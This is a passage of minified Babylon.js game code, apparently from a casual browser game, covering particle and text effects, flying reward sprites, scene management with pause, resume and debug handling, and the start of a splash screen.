(e.scaleX.start=1),e.scaleX.hasOwnProperty("end")||(e.scaleX.end=e.scaleX.start),e.scaleX.delta=e.scaleX.start-e.scaleX.end);e.hasOwnProperty("scaleY")&&(e.scaleY.hasOwnProperty("start")||(e.scaleY.start=1),e.scaleY.hasOwnProperty("end")||(e.scaleY.end=e.scaleX.start),e.scaleY.delta=e.scaleY.start-e.scaleY.end);e.hasOwnProperty("alpha")?(e.alpha.hasOwnProperty("start")||(e.alpha.start=1),e.alpha.hasOwnProperty("end")||(e.alpha.end=e.alpha.start)):e.alpha={start:1,end:1};e.alpha.delta=e.alpha.start-
e.alpha.end;for(var f=null,h=0;h<this.objParticles.length&&null==f;h++)this.objParticles[h].sprite.isVisible||(f=this.objParticles[h],SetImageFromSpritesheet(this.objParticles[h].sprite,AssetLoader.instance.loadedImages[e.texturePackImage],AssetLoader.instance.loadedJSONs[e.texturePackData].frames,e.frameName));if(null===f){if(this.objParticles.length==this.MAX_PARTICLES)return null;f=this.objParticles[this.objParticles.length]={};f.sprite=new BABYLON.GUI.Image("Particles"+(this.objParticles.length-
1));f.sprite.transformCenterX=.5;f.sprite.transformCenterY=.5;this.guiParent.addControl(f.sprite);SetImageFromSpritesheet(f.sprite,AssetLoader.instance.loadedImages[e.texturePackImage],AssetLoader.instance.loadedJSONs[e.texturePackData].frames,e.frameName)}f.sprite.isVisible=!0;f.sprite.alpha=e.alpha.start;f.sprite.rotation=e.angle;f.sprite.leftInPixels=a;f.sprite.topInPixels=b;f.sprite.scaleX=1;f.sprite.scaleY=1;f.data=e;f.data.lifeInit=e.life;f.sprite.scaleX=f.data.scale.start;f.sprite.scaleY=f.data.scale.start;
f.data.hasOwnProperty("scaleX")&&(f.sprite.scaleX=f.data.scaleX.start);f.data.hasOwnProperty("scaleY")&&(f.sprite.scaleY=f.data.scaleY.start);return f},Reset:function(){for(var a=0;a<this.objParticles.length;a++)this.objParticles[a].sprite.isVisible=!1},GetActiveCount:function(a){a=a||null;for(var b=0,e=0;e<this.objParticles.length;e++)(null==a||this.objParticles[e].data.tag==a)&&this.objParticles[e].sprite.isVisible&&0<this.objParticles[e].data.life&&b++;return b},Update:function(){for(var a=0;a<
this.objParticles.length;a++)if(this.objParticles[a].sprite.isVisible){var b=activeScene.deltaTime,e=b/16.6666;this.objParticles[a].data.life-=b;0>=this.objParticles[a].data.life?(this.objParticles[a].sprite.isVisible=!1,null!=this.objParticles[a].data.callback&&this.objParticles[a].data.callback(this.objParticles[a])):(this.objParticles[a].sprite.alpha=this.objParticles[a].data.alpha.start-this.objParticles[a].data.alpha.delta+this.objParticles[a].data.life/this.objParticles[a].data.lifeInit*this.objParticles[a].data.alpha.delta,
b=this.objParticles[a].data.scale.start-this.objParticles[a].data.scale.delta+this.objParticles[a].data.life/this.objParticles[a].data.lifeInit*this.objParticles[a].data.scale.delta,this.objParticles[a].sprite.scaleX=b,this.objParticles[a].sprite.scaleY=b,this.objParticles[a].data.hasOwnProperty("scaleX")&&(this.objParticles[a].sprite.scaleX=this.objParticles[a].data.scaleX.start-this.objParticles[a].data.scaleX.delta+this.objParticles[a].data.life/this.objParticles[a].data.lifeInit*this.objParticles[a].data.scaleX.delta),
this.objParticles[a].data.hasOwnProperty("scaleY")&&(this.objParticles[a].sprite.scaleY=this.objParticles[a].data.scaleY.start-this.objParticles[a].data.scaleY.delta+this.objParticles[a].data.life/this.objParticles[a].data.lifeInit*this.objParticles[a].data.scaleY.delta),this.objParticles[a].data.hasOwnProperty("frames"),this.objParticles[a].sprite.rotation+=this.objParticles[a].data.rotation*e,this.objParticles[a].sprite.leftInPixels+=this.objParticles[a].data.velX*e,this.objParticles[a].sprite.topInPixels+=
this.objParticles[a].data.velY*e,this.objParticles[a].data.velX+=this.objParticles[a].data.accX*e,this.objParticles[a].data.velY+=this.objParticles[a].data.accY*e)}},Destroy:function(){for(var a=0;a<this.objParticles.length;a++)this.objParticles[a].sprite.dispose(),this.objParticles[a].sprite=null,this.objParticles[a]=null;this.objParticles=null},CreateBubbles:function(a,b,e,f,h){for(f=(f||10)-1;0<=f;f--){tmpX=getRandomIntInRange(-100,100)/3;tmpY=getRandomUIntInRange(50,100)/30;var m=(5+getRandomUInt(5))/
10,k=(2+getRandomUInt(5))/10;m={velX:0,velY:-tmpY,accX:0,accY:0>=tmpY?.01:-.01,sprite:"menu",frameName:"icon_result_star.png",rotation:4,scale:{start:0,end:m},alpha:{start:k,end:0},life:h};m=this.CreateParticle(a+3*getRandomIntInRange(-5,5),b+3*getRandomIntInRange(-5,5),m);null!=m&&(m.sprite.tint=e)}},CreateFinalStars:function(a,b,e,f){void 0===f&&(f=null);for(e=(e||10)-1;0<=e;e--){tmpX=getRandomIntInRange(-100,100)/40;tmpY=getRandomIntInRange(-100,100)/40;var h=getRandomUInt(50)/100,m=null;0==e&&
(m=f);h={velX:tmpX,velY:tmpY,accX:0>=tmpX?.01:-.01,accY:0>=tmpY?.01:-.01,texturePackImage:"pak1.png",texturePackData:"pak1.json",frameName:"star_bright.png",rotation:0>=tmpX?.04:-.04,scale:{start:.2*Resolution.SCALE,end:(2.5-h)*Resolution.SCALE},alpha:{start:.9,end:0},life:250+30*getRandomUInt(10),callback:m};this.CreateParticle(a,b,h)}},CreateMoneySpent:function(a,b,e,f){void 0===f&&(f=null);for(e=(e||10)-1;0<=e;e--){tmpX=getRandomIntInRange(-100,100)/70;tmpY=getRandomIntInRange(-100,-50)/40;var h=
getRandomUInt(50)/100,m=null;0==e&&(m=f);h={velX:tmpX,velY:tmpY,accX:0>=tmpX?.01:-.01,accY:.2,texturePackImage:"pak1.png",texturePackData:"pak1.json",frameName:"coin.png",rotation:0>=tmpX?.04:-.04,scale:{start:.8*Resolution.SCALE,end:(1-h)*Resolution.SCALE},alpha:{start:1,end:0},life:450+30*getRandomUInt(10),callback:m};this.CreateParticle(a,b,h)}},CreateMergeEffect:function(a,b,e,f,h){void 0===h&&(h=null);for(f=(f||10)-1;0<=f;f--){tmpX=getRandomIntInRange(-100,100)/70;tmpY=getRandomIntInRange(-100,
100)/70;var m=getRandomUInt(50)/500,k=null;0==f&&(k=h);m={velX:tmpX,velY:tmpY,accX:0>=tmpX?.04:-.04,accY:0>=tmpY?.04:-.04,texturePackImage:"objects.png",texturePackData:"objects.json",frameName:e,rotation:0>=tmpX?.02:-.02,scale:{start:.5*Resolution.SCALE,end:(.6-m)*Resolution.SCALE},alpha:{start:.9,end:0},life:250+30*getRandomUInt(10),callback:k};this.CreateParticle(a,b,m)}},CreateExplosionEffect:function(a,b,e,f,h){void 0===h&&(h=null);for(f=(f||10)-1;0<=f;f--){tmpX=getRandomIntInRange(-100,100)/
70;tmpY=getRandomIntInRange(-100,100)/70;var m=getRandomUInt(50)/500,k=null;0==f&&(k=h);m={velX:tmpX,velY:tmpY,accX:0>=tmpX?.04:-.04,accY:0>=tmpY?.04:-.04,texturePackImage:"objects.png",texturePackData:"objects.json",frameName:e,rotation:0>=tmpX?.02:-.02,scale:{start:1.2*Resolution.SCALE,end:(.6-m)*Resolution.SCALE},alpha:{start:.9,end:0},life:350+30*getRandomUInt(10),callback:k};this.CreateParticle(a,b,m)}},CreateVehicleSmoke:function(a,b,e,f){void 0===f&&(f=null);for(e=(e||1)-1;0<=e;e--){tmpX=getRandomIntInRange(-100,
100)/120;tmpY=getRandomIntInRange(-100,100)/120;getRandomUInt(50);var h=null;0==e&&(h=f);h={velX:0,velY:0,accX:0,accY:0,texturePackImage:"pak1.png",texturePackData:"pak1.json",frameName:"exhaust_particle_"+(getRandomUInt(6)+1)+".png",rotation:0>=tmpX?.03:-.03,scale:{start:.8*Resolution.SCALE,end:.3*Resolution.SCALE},alpha:{start:1,end:1},life:220+2*getRandomUInt(10),callback:h};var m=a+getRandomIntInRange(-3,3),k=b+getRandomIntInRange(-3,3);this.CreateParticle(m,k,h)}}};
function getAbsoluteGuiPositionLeft(a){var b=0;"root"!=a.parent.name&&(b=getAbsoluteGuiPositionLeft(a.parent));if(a.horizontalAlignment==BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER)return b+a.leftInPixels*a.parent.scaleX;if(a.horizontalAlignment==BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_LEFT)return b-a._cachedParentMeasure.width/2*a.parent.scaleX+a.leftInPixels*a.parent.scaleX;if(a.horizontalAlignment==BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_RIGHT)return b+a._cachedParentMeasure.width/2*a.parent.scaleX+
a.leftInPixels*a.parent.scaleX}
function getAbsoluteGuiPositionTop(a){var b=0;"root"!=a.parent.name&&(b=getAbsoluteGuiPositionTop(a.parent));if(a.verticalAlignment==BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER)return b+a.topInPixels*a.parent.scaleY;if(a.verticalAlignment==BABYLON.GUI.Control.VERTICAL_ALIGNMENT_TOP)return b-engine.getRenderHeight()/2+a.topInPixels*a.parent.scaleY;if(a.verticalAlignment==BABYLON.GUI.Control.VERTICAL_ALIGNMENT_BOTTOM)return b+engine.getRenderHeight()/2+a.topInPixels*a.parent.scaleY};TextParticles=function(a){this.MAX_PARTICLES=3;this.objTextParticles=[];this._init(a);TextParticles.instance=this};TextParticles.instance=null;
TextParticles.prototype={constructor:TextParticles,_init:function(a){this.guiParent=a;a={tag:"",velX:0,velY:0,accX:0,accY:0};for(var b=0;b<this.MAX_PARTICLES;b++)this.CreateTextParticle(0,0,"DUMMY",a);for(b=0;b<this.MAX_PARTICLES;b++)this.objTextParticles[b].sprite.isVisible=!1},CreateTextParticle:function(a,b,e,f){f.hasOwnProperty("tag")||(f.tag="");f.hasOwnProperty("fontFamily")||(f.fontFamily="gamefont");f.hasOwnProperty("fontSize")||(f.fontSize=20);f.hasOwnProperty("shadowColor")||(f.shadowColor=
TEXT_SHADOWS_ENABLED?"rgba(80,80,80,0.5)":"rgba(80,80,80,0)");f.hasOwnProperty("outlineWidth")||(f.outlineWidth=0);f.hasOwnProperty("outlineColor")||(f.outlineColor="rgba(80,80,80,0)");f.hasOwnProperty("shadowOffsetX")||(f.shadowOffsetX=0);f.hasOwnProperty("shadowOffsetY")||(f.shadowOffsetY=0);f.hasOwnProperty("shadowBlur")||(f.shadowBlur=0);f.hasOwnProperty("life")||(f.life=500+getRandomUInt(200));f.hasOwnProperty("velX")||(f.velX=0);f.hasOwnProperty("velY")||(f.velY=0);f.hasOwnProperty("accX")||
(f.accX=0);f.hasOwnProperty("accY")||(f.accY=0);f.hasOwnProperty("rotation")||(f.rotation=0);f.hasOwnProperty("scale")?(f.scale.hasOwnProperty("start")||(f.scale.start=1),f.scale.hasOwnProperty("end")||(f.scale.end=f.scale.start)):f.scale={start:1,end:1};f.scale.delta=f.scale.start-f.scale.end;f.hasOwnProperty("alpha")?(f.alpha.hasOwnProperty("start")||(f.alpha.start=1),f.alpha.hasOwnProperty("end")||(f.alpha.end=f.alpha.start)):f.alpha={start:1,end:1};f.alpha.delta=f.alpha.start-f.alpha.end;for(var h=
null,m=0;m<this.objTextParticles.length&&null==h;m++)this.objTextParticles[m].sprite.isVisible||(h=this.objTextParticles[m],h.sprite.text=e,h.sprite.fontStyle=f.style);null===h&&(h=this.objTextParticles[this.objTextParticles.length]={},h.sprite=new BABYLON.GUI.TextBlock("textParticle"),h.sprite.transformCenterX=.5,h.sprite.transformCenterY=.5,h.sprite.textWrapping=!1,h.sprite.leftInPixels=-1E4,h.sprite.topInPixels=-1E4,h.sprite.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER,
h.sprite.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER,h.sprite.isPointerBlocker=!1,h.sprite.isHitTestVisible=!1,this.guiParent.addControl(h.sprite));m=h.sprite.parent;m.removeControl(h.sprite);m.addControl(h.sprite);h.sprite.outlineWidth=f.outlineWidth;h.sprite.outlineColor=f.outlineColor;h.sprite.shadowOffsetX=f.shadowOffsetX;h.sprite.shadowOffsetY=f.shadowOffsetY;h.sprite.shadowColor=f.shadowColor;h.sprite.shadowBlur=f.shadowBlur;h.sprite.fontFamily=f.fontFamily;h.sprite.fontSize=
f.fontSize;h.sprite.color=f.color;h.sprite.text=e;h.sprite.alpha=f.alpha.start;h.sprite.angle=0;h.sprite.leftInPixels=a;h.sprite.topInPixels=b;h.sprite.scaleX=h.sprite.scaleY=1;h.data=f;h.data.lifeInit=f.life;h.sprite.isVisible=!0;h.sprite._resetFontCache();0<f.tag.length&&LOG("TILES : "+Particles.instance.GetActiveCount(f.tag));return h},Reset:function(){for(var a=0;a<this.objTextParticles.length;a++)this.objTextParticles[a].sprite.isVisible=!1},GetActiveCount:function(a){a=a||null;for(var b=0,e=
0;e<this.objTextParticles.length;e++)(null==a||this.objTextParticles[e].data.tag==a)&&this.objTextParticles[e].sprite.isVisible&&0<this.objTextParticles[e].data.life&&b++;return b},Update:function(){for(var a=0;a<this.objTextParticles.length;a++)this.objTextParticles[a].sprite.isVisible&&(this.objTextParticles[a].data.life-=activeScene.deltaTime,0>=this.objTextParticles[a].data.life?this.objTextParticles[a].sprite.isVisible=!1:(this.objTextParticles[a].sprite.alpha=this.objTextParticles[a].data.alpha.start-
this.objTextParticles[a].data.alpha.delta+this.objTextParticles[a].data.life/this.objTextParticles[a].data.lifeInit*this.objTextParticles[a].data.alpha.delta,this.objTextParticles[a].sprite.scaleX=this.objTextParticles[a].sprite.scaleY=this.objTextParticles[a].data.scale.start-this.objTextParticles[a].data.scale.delta+this.objTextParticles[a].data.life/this.objTextParticles[a].data.lifeInit*this.objTextParticles[a].data.scale.delta,this.objTextParticles[a].sprite.rotation+=this.objTextParticles[a].data.rotation,
this.objTextParticles[a].sprite.leftInPixels+=this.objTextParticles[a].data.velX*activeScene.getCpuSpeedMul()*Resolution.SCALE,this.objTextParticles[a].sprite.topInPixels+=this.objTextParticles[a].data.velY*activeScene.getCpuSpeedMul()*Resolution.SCALE,this.objTextParticles[a].data.velX+=this.objTextParticles[a].data.accX,this.objTextParticles[a].data.velY+=this.objTextParticles[a].data.accY))},Destroy:function(){for(var a=0;a<this.objTextParticles.length;a++)this.objTextParticles[a].sprite.dispose(),
this.objTextParticles[a].sprite=null,this.objTextParticles[a]=null;this.objTextParticles=null},CreateTextParticle1:function(a,b,e,f,h,m){void 0===m&&(m=1);tmpY=getRandomIntInRange(-150,-100)/150;return this.CreateTextParticle(a,b,e,{velX:0,velY:-.7,accX:0,accY:.02,fontSize:f*Resolution.SCALE,color:h,outlineColor:"#000000",outlineWidth:6,rotation:0,scale:{start:1,end:.9},alpha:{start:1*m,end:.6*m},life:500})}};FlyingSprites=function(a){this.MAX_SPRITES=50;this.objSprites=[];this._init(a);FlyingSprites.instance=this};FlyingSprites.instance=null;
FlyingSprites.prototype={constructor:FlyingSprites,_init:function(a){this.guiParent=a;a={tag:"",destX:0,destY:0,texturePackImage:"pak1.png",texturePackData:"pak1.json",frameName:"void.png"};for(var b=0;b<this.MAX_SPRITES;b++)this.CreateFlyingSprite(0,0,a);for(b=0;b<this.MAX_SPRITES;b++)this.objSprites[b].sprite.isVisible=!1},CreateFlyingSprite:function(a,b,e){e.startX=a;e.startY=b;e.deltaX=e.destX-e.startX;e.deltaY=e.destY-e.startY;e.hasOwnProperty("tag")||(e.tag="");e.hasOwnProperty("easingFunc")||
(e.easingFunc=easeInSine);e.hasOwnProperty("callback")||(e.callback=null);e.hasOwnProperty("frame")||(e.frame=0);e.hasOwnProperty("life")||(e.life=500+getRandomUInt(200));e.hasOwnProperty("rotation")||(e.rotation=0);e.hasOwnProperty("angle")||(e.angle=0);e.hasOwnProperty("scale")?(e.scale.hasOwnProperty("start")||(e.scale.start=1),e.scale.hasOwnProperty("end")||(e.scale.end=e.scale.start)):e.scale={start:1,end:1};e.scale.delta=e.scale.start-e.scale.end;e.hasOwnProperty("scaleX")&&(e.scaleX.hasOwnProperty("start")||
(e.scaleX.start=1),e.scaleX.hasOwnProperty("end")||(e.scaleX.end=e.scaleX.start),e.scaleX.delta=e.scaleX.start-e.scaleX.end);e.hasOwnProperty("scaleY")&&(e.scaleY.hasOwnProperty("start")||(e.scaleY.start=1),e.scaleY.hasOwnProperty("end")||(e.scaleY.end=e.scaleX.start),e.scaleY.delta=e.scaleY.start-e.scaleY.end);e.hasOwnProperty("alpha")?(e.alpha.hasOwnProperty("start")||(e.alpha.start=1),e.alpha.hasOwnProperty("end")||(e.alpha.end=e.alpha.start)):e.alpha={start:1,end:1};e.alpha.delta=e.alpha.start-
e.alpha.end;for(var f=null,h=0;h<this.objSprites.length&&null==f;h++)this.objSprites[h].sprite.isVisible||(f=this.objSprites[h],SetImageFromSpritesheet(this.objSprites[h].sprite,AssetLoader.instance.loadedImages[e.texturePackImage],AssetLoader.instance.loadedJSONs[e.texturePackData].frames,e.frameName));if(null===f){if(this.objSprites.length==this.MAX_SPRITES)return null;f=this.objSprites[this.objSprites.length]={};f.sprite=new BABYLON.GUI.Image("FlyingSprites"+(this.objSprites.length-1));f.sprite.transformCenterX=
.5;f.sprite.transformCenterY=.5;this.guiParent.addControl(f.sprite);SetImageFromSpritesheet(f.sprite,AssetLoader.instance.loadedImages[e.texturePackImage],AssetLoader.instance.loadedJSONs[e.texturePackData].frames,e.frameName)}f.sprite.isVisible=!0;f.sprite.alpha=e.alpha.start;f.sprite.rotation=e.angle;f.sprite.leftInPixels=a;f.sprite.topInPixels=b;f.sprite.scaleX=1;f.sprite.scaleY=1;f.data=e;f.data.lifeInit=e.life;f.sprite.scaleX=f.data.scale.start;f.sprite.scaleY=f.data.scale.start;f.data.hasOwnProperty("scaleX")&&
(f.sprite.scaleX=f.data.scaleX.start);f.data.hasOwnProperty("scaleY")&&(f.sprite.scaleY=f.data.scaleY.start);return f},Reset:function(){for(var a=0;a<this.objSprites.length;a++)this.objSprites[a].sprite.isVisible=!1},GetActiveCount:function(a){a=a||null;for(var b=0,e=0;e<this.objSprites.length;e++)(null==a||this.objSprites[e].data.tag==a)&&this.objSprites[e].sprite.isVisible&&0<this.objSprites[e].data.life&&b++;return b},Update:function(){for(var a=0;a<this.objSprites.length;a++)if(this.objSprites[a].sprite.isVisible){var b=
activeScene.deltaTime,e=b/16.6666;this.objSprites[a].data.life-=b;if(0>=this.objSprites[a].data.life)this.objSprites[a].sprite.isVisible=!1,null!=this.objSprites[a].data.callback&&this.objSprites[a].data.callback(this.objSprites[a]);else{b=this.objSprites[a].data.life/this.objSprites[a].data.lifeInit;this.objSprites[a].sprite.alpha=this.objSprites[a].data.alpha.start-this.objSprites[a].data.alpha.delta+b*this.objSprites[a].data.alpha.delta;var f=this.objSprites[a].data.scale.start-this.objSprites[a].data.scale.delta+
b*this.objSprites[a].data.scale.delta;this.objSprites[a].sprite.scaleX=f;this.objSprites[a].sprite.scaleY=f;this.objSprites[a].data.hasOwnProperty("scaleX")&&(this.objSprites[a].sprite.scaleX=this.objSprites[a].data.scaleX.start-this.objSprites[a].data.scaleX.delta+b*this.objSprites[a].data.scaleX.delta);this.objSprites[a].data.hasOwnProperty("scaleY")&&(this.objSprites[a].sprite.scaleY=this.objSprites[a].data.scaleY.start-this.objSprites[a].data.scaleY.delta+b*this.objSprites[a].data.scaleY.delta);
this.objSprites[a].data.hasOwnProperty("frames");this.objSprites[a].sprite.rotation+=this.objSprites[a].data.rotation*e;this.objSprites[a].sprite.leftInPixels=this.objSprites[a].data.startX+this.objSprites[a].data.easingFunc(1-b)*this.objSprites[a].data.deltaX;this.objSprites[a].sprite.topInPixels=this.objSprites[a].data.startY+this.objSprites[a].data.easingFunc(1-b)*this.objSprites[a].data.deltaY}}},Destroy:function(){for(var a=0;a<this.objSprites.length;a++)this.objSprites[a].sprite.dispose(),this.objSprites[a].sprite=
null,this.objSprites[a]=null;this.objSprites=null},CreateEarnedTrophy:function(a,b,e,f){void 0===f&&(f=null);getRandomIntInRange(-100,100);e={destX:a,destY:b,texturePackImage:"pak2.png",texturePackData:"pak2.json",frameName:"icon_instructions_trophy_small.png",scale:{start:.9*Resolution.SCALE,end:.7*Resolution.SCALE},alpha:{start:1,end:.5},life:e+10*getRandomInt(20),callback:f};this.CreateFlyingSprite(a+10*getRandomInt(5),b+10*getRandomInt(5)+100,e)},CreateFlyingEarnedCoin:function(a,b,e,f,h,m,k,
n){void 0===n&&(n=null);getRandomIntInRange(-100,100);e={destX:e,destY:f,texturePackImage:"pak1.png",texturePackData:"pak1.json",frameName:"coin_button.png",rotation:.04,scale:{start:k*Resolution.SCALE,end:.7*Resolution.SCALE},alpha:{start:1,end:1},life:m+30*getRandomUInt(10),amount:h,callback:n};return this.CreateFlyingSprite(a,b,e)},CreateFlyingGift:function(a,b,e,f,h,m,k){void 0===k&&(k=null);getRandomIntInRange(-100,100);e={destX:e,destY:f,texturePackImage:"objects.png",texturePackData:"objects.json",
frameName:EventColor+"_gift.png",rotation:.04,scale:{start:.5*Resolution.SCALE,end:.3*Resolution.SCALE},alpha:{start:1,end:.7},life:m+30*getRandomUInt(10),amount:h,callback:k};return this.CreateFlyingSprite(a,b,e)},CreateFlyingBooster:function(a,b,e,f,h,m,k){void 0===k&&(k=null);getRandomIntInRange(-100,100);a={destX:f,destY:h,texturePackImage:"pak1.png",texturePackData:"pak1.json",frameName:"booster_"+a+".png",rotation:.04,scale:{start:.8*Resolution.SCALE,end:.3*Resolution.SCALE},alpha:{start:1,
end:.7},life:m+30*getRandomUInt(10),booster:a,callback:k};return this.CreateFlyingSprite(b,e,a)}};var USING_V2_PHYSICS=!0,SceneMain=function(a){SceneMain.instance=this;this.create(a)};SceneMain.instance=null;
SceneMain.prototype={create:function(a){inlModule.ads.triggerAdPoint({adType:AD_TYPES.PREROLL});this.debugingEnabledOnce=!1;this.scene=new BABYLON.Scene(a);this.scene.animationsEnabled=!0;this.scene.autoClear=!1;this.scene.autoClearDepthAndStencil=!1;this.scene.clearColor=new BABYLON.Color4(.3,.3,.3,1);this.scene.performancePriority=BABYLON.ScenePerformancePriority.Intermediate;this.scene.skipPointerMovePicking=!0;this.animationTimeScale=this.scene.animationTimeScale;this.gravityVector=new BABYLON.Vector3(0,
-9.81,0);this.scene.onPointerObservable.add(function(b){this.onPointerObservable(b)}.bind(this));this.scene.onKeyboardObservable.add(function(b){this.onKeyboardObservable(b)}.bind(this));this.editorEnabled=this.allPaused=this.gamePaused=this.gameRunning=!1;this.activeScreens=[];BABYLON.GUI.Control.AllowAlphaInheritance=!0},addSceneOptimizer:function(){var a=new BABYLON.SceneOptimizerOptions(60,500);a.addOptimization(new BABYLON.HardwareScalingOptimization(0,1));this.sceneOptimizer=new BABYLON.SceneOptimizer(this.scene,
a);this.sceneOptimizer.onSuccessObservable.add(function(b){console.warn("SceneMain.sceneOptimizer : ")});this.sceneOptimizer.onNewOptimizationAppliedObservable.add(function(b){console.warn("SceneMain.sceneOptimizer.onNewOptimizationAppliedObservable : "+b.getDescription())});this.sceneOptimizer.onFailureObservable.add(function(b){console.warn("SceneMain.sceneOptimizer.onFailureObservable : ")});this.sceneOptimizer.start()},addScreen:function(a){a.scene=this;this.activeScreens.push(a)},removeScreen:function(a){for(var b=
0;b<this.activeScreens.length;b++)if(this.activeScreens[b]==a){this.activeScreens.splice(b,1);break}},getDeltaTime:function(){var a=this.scene.deltaTime;1>a&&(a=1);41.665<a&&(a=41.665);return a},getCpuSpeedMul:function(){return this.deltaTime/16.6666},beforeRender:function(){if(!(this.allPaused||(GlobalDate=new Date,this.deltaTime=this.getDeltaTime(),void 0!==this.scene.deltaTime&&this._addTimeStep(Math.floor(this.deltaTime)/1E3),0>=this.deltaTime)))for(var a=0;a<this.activeScreens.length;a++)"function"===
typeof this.activeScreens[a].beforeRender&&this.activeScreens[a].beforeRender()},afterRender:function(){if(!this.allPaused)for(var a=0;a<this.activeScreens.length;a++)"function"===typeof this.activeScreens[a].afterRender&&this.activeScreens[a].afterRender()},_addTimeStep:function(a){this.hasOwnProperty("_timesteps")||(this._timesteps=[]);this._timesteps.push(a);10<this._timesteps.length&&this._timesteps.splice(0,1)},_getAvgTimeStep:function(){for(var a=0,b=0;b<this._timesteps.length;b++)a+=this._timesteps[b];
a/=this._timesteps.length;.334<a&&(a=.334);return a},render:function(){this.scene.render()},updateTexts:function(){for(var a=0;a<this.activeScreens.length;a++)"function"===typeof this.activeScreens[a].updateTexts&&this.activeScreens[a].updateTexts()},onPointerObservable:function(a){for(var b=0;b<this.activeScreens.length;b++)if("function"===typeof this.activeScreens[b].onPointerObservable)this.activeScreens[b].onPointerObservable(a)},onKeyboardObservable:function(a){for(var b=0;b<this.activeScreens.length;b++)if("function"===
typeof this.activeScreens[b].onKeyboardObservable)this.activeScreens[b].onKeyboardObservable(a)},onResize:function(a){for(var b=0;b<this.activeScreens.length;b++)if("function"===typeof this.activeScreens[b].onResize)this.activeScreens[b].onResize(a)},onGameVisible:function(a){this.onGameResume()},onGameFocus:function(a){this.onGameResume()},onGameHidden:function(a){this.onGamePause()},onGameBlur:function(a){this.onGamePause()},onGamePause:function(){if(!this.allPaused){for(var a=0;a<this.activeScreens.length;a++)if("function"===
typeof this.activeScreens[a].onGamePause)this.activeScreens[a].onGamePause();this.allPaused=!0;this.scene.prevAnimationTimeScale=this.scene.animationTimeScale;this.scene.animationTimeScale=0;setTimeout(()=>{null!=soundManager&&(soundManager.pauseAllMusic(),soundManager.pauseAllSounds())},500)}},onGameResume:function(){if(this.allPaused){setTimeout(()=>{BABYLON.Engine.audioEngine.audioContext.resume();null!=soundManager&&(soundManager.resumeAllMusic(),soundManager.resumeAllSounds())},500);this.scene.animationTimeScale=
this.scene.prevAnimationTimeScale;this.allPaused=!1;for(var a=0;a<this.activeScreens.length;a++)if("function"===typeof this.activeScreens[a].onGameResume)this.activeScreens[a].onGameResume()}},enableDebug:function(){this.debugingEnabledOnce=!0;screenTopPanel.disableControls();screenTopPanel.guiRoot.alpha=0;this.scene.activeCameras=[];this.scene.activeCamera=screenGame.cameraDebug;screenGame.cameraDebug.position=v3(screenGame.cameraPlayer.position.x,screenGame.cameraPlayer.position.y,screenGame.cameraPlayer.position.z);
screenGame.cameraDebug.rotation=v3(screenGame.cameraPlayer.rotation.x,screenGame.cameraPlayer.rotation.y,screenGame.cameraPlayer.rotation.z);screenGame.cameraDebug.attachControl(canvas,!0);screenGame.cameraDebug.layerMask=screenGame.cameraPlayer.layerMask;this.editorEnabled=!0;this.scene.debugLayer.show()},disableDebug:function(){screenTopPanel.enableControls();screenTopPanel.guiRoot.alpha=1;this.scene.activeCameras=[];this.scene.activeCamera=screenGame.cameraPlayer;this.editorEnabled=!1;this.scene.debugLayer.hide()}};var ScreenSplash=function(a){ScreenSplash.instance=this;this.create(a)};ScreenSplash.instance=null;
ScreenSplash.prototype={create:function(a){this.scene=a;this.rootNode=new BABYLON.TransformNode("ScreenSplash");this.createCamera();this.createGui()},createCamera:function(){this.camera=new BABYLON.FreeCamera("camera",new BABYLON.Vector3(0,0,-2),this.scene);this.camera.parent=this.rootNode;this.camera.setTarget(new BABYLON.Vector3(0,0,0));this.camera.mode=BABYLON.Camera.ORTHOGRAPHIC_CAMERA;this.camera.orthoTop=1;this.camera.orthoBottom=-1;this.camera.orthoLeft=-2;this.camera.orthoRight=2},createGui:function(){this.guiTexture=
BABYLON.GUI.AdvancedDynamicTexture.CreateFullscreenUI("ScreenSplash_GUI",!0,activeScene.scene);this.guiTexture.layer.layerMask=LAYER_SCREEN_BACKGROUND;this.guiTexture.rootContainer.highlightLineWidth=0;this.initGuiControls(this.guiTexture)},initGuiControls:function(a){this.pnlBackground=new BABYLON.GUI.Rectangle;this.pnlBackground.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.pnlBackground.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.pnlBackground.widthInPixels=
300;this.pnlBackground.heightInPixels=300;this.pnlBackground.background="#BB464B";this.pnlBackground.thickness=0;a.addControl(this.pnlBackground);this.imgSplash=new BABYLON.GUI.Image;this.imgSplash.transformCenterX=.5;this.imgSplash.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgSplash.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgSplash.isPointerBlocker=!1;this.imgSplash.isHitTestVisible=!1;this.imgSplash.topInPixels=0;this.imgSplash.domImage=
AssetLoader.instance.loadedImages["splash.jpg"];a.addControl(this.imgSplash);this.imgLogo=new BABYLON.GUI.Image;this.imgLogo.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_LEFT;this.imgLogo.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_TOP;this.imgLogo.isPointerBlocker=!1;this.imgLogo.isHitTestVisible=!1;this.imgLogo.topInPixels=0;this.imgLogo.domImage=AssetLoader.instance.loadedImages["gametitle_en.png"];"ru"==Languages.instance.language&&(this.imgLogo.domImage=AssetLoader.instance.loadedImages["gametitle_ru.png"]);
a.addControl(this.imgLogo);this.txtContinue=this.createContinueText();this.txtContinue.alpha=14;a.addControl(this.txtContinue);this.imgInlogicSplash=new BABYLON.GUI.Image;this.imgInlogicSplash.transformCenterX=.5;this.imgInlogicSplash.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgInlogicSplash.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgInlogicSplash.isPointerBlocker=!1;this.imgInlogicSplash.isHitTestVisible=!1;this.imgInlogicSplash.topInPixels=
